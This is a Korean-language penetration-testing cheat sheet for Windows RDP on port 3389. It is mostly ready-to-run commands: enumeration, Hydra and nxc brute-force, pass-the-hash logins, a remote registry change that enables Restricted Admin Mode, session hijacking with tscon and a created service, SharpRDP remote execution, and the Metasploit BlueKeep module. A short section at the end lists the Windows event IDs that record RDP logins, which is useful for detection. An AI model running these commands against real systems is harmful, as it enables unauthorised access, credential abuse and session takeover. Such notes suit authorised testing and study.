# RDP (3389)

Remote Desktop Protocol. Windows 원격 데스크톱 접속.

---

## 열거

```bash
nmap -sV -sC -p 3389 TARGET
nmap --script=rdp-enum-encryption,rdp-ntlm-info -p 3389 TARGET
```

---

## 접속

```bash
# xfreerdp
xfreerdp /v:TARGET /u:user /p:pass /cert-ignore /dynamic-resolution

# NTLM Hash (Restricted Admin Mode 필요)
xfreerdp /v:TARGET /u:user /pth:NTHASH /cert-ignore

# 클립보드 & 드라이브 공유
xfreerdp /v:TARGET /u:user /p:pass /cert-ignore +clipboard /drive:share,/tmp

# rdesktop
rdesktop TARGET -u user -p pass -g 1920x1080
```

---

## 인증 공격

```bash
# Hydra
hydra -l user -P passwords.txt rdp://TARGET -t 4

# nxc
nxc rdp TARGET -u users.txt -p 'Password1!' --continue-on-success

# 주의: NLA(Network Level Authentication)이 활성화되면 brute force 시 계정 잠금 발생 가능
```

---

## 공격

### Restricted Admin Mode

```bash
# Restricted Admin 활성화 여부 확인 (레지스트리)
# HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0

# Pass-the-Hash로 RDP 접속
xfreerdp /v:TARGET /u:admin /pth:NTHASH /cert-ignore

# 원격으로 Restricted Admin 활성화
nxc smb TARGET -u admin -H HASH -x "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
```

### RDP Session Hijacking

```powershell
# 관리자 권한으로 다른 사용자의 RDP 세션 탈취
# 세션 목록 확인
query user

# SYSTEM 권한으로 세션 연결 (비밀번호 불필요)
tscon SESSION_ID /dest:rdp-tcp#0
# 또는 서비스로 실행
sc create rdphijack binpath="cmd.exe /k tscon SESSION_ID /dest:rdp-tcp#0" start=demand
net start rdphijack
```

### RDP 키로깅/캡처

```bash
# SharpRDP - RDP를 통한 원격 명령 실행 (GUI 없이)
SharpRDP.exe computername=TARGET command="whoami" username=DOMAIN\user password=pass
```

---

## BlueKeep (CVE-2019-0708)

```bash
# 취약점 확인
nmap --script=rdp-vuln-ms12-020 -p 3389 TARGET

# Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

---

## 유의사항

!!! tip "RDP 접속 시 로그"
    - Security 이벤트 로그: 4624 (Type 10 = RemoteInteractive)
    - TerminalServices-RemoteConnectionManager: 1149
    - TerminalServices-LocalSessionManager: 21, 22
